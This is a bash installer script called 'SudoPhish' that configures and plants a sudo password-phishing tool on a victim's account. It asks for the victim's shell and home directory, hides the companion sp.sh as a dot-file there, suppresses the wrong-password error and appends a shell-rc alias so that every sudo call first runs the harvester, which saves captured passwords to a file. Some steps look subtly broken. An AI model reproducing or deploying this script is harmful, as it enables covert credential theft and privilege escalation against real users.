#!/bin/bash

echo "SudoPhish"
echo "By Michael C. Dim."
echo "mk@mcdim.xyz"
echo ""
sleep 1
echo " --=  Wizard  =--"
sleep 1
echo "Make sure the sp.sh file is in the same directory as the wizard."
sleep 1
echo "The sp.sh file must be unmodified."
sleep 1
echo ""
echo -n "A) What is the victim's interactive Shell (bash/zsh)? "
read shell
echo -n "B) Type the full (absolute) path to the victim's home directory (i.e /home/peter): "
read homedir
echo -n "C) Does the victim need to type a password for sudo? (yes if unsure) [y/n] "
read reply
echo "D) Once the password is harvested, it will be saved in a file. What do you want that filename/path to be? "
read filename

# Set the shell
echo "$shell"
shell_sub() {
	cp sp.sh sp.sh.tmp1
	sed "s/bash/$shell/g" sp.sh.tmp1 > sp.sh
	shred -fu sp.sh.tmp1
}

shell_sub


# Hide wrong password error

commentit() {
	cp sp.sh sp.sh.tmp2
	sed '28 s/./#&/' sp.sh.tmp2 > sp.sh
	shred -fu sp.sh.tmp2
}

[ $reply = "n" -o $reply = "N" ] && commentit


# Filename

filename() {
	cp sp.sh sp.sh.tmp3
	sed "s/.pwd/$filename/g" sp.sh.tmp3 > sp.sh
	shred -fu sp.sh.tmp3
}

chmod +x sp.sh
mv sp.sh "$homedir"/.sp.sh

echo "alias sudo=\"~/.sp.sh; sudo\"" >> ."$shell"rc
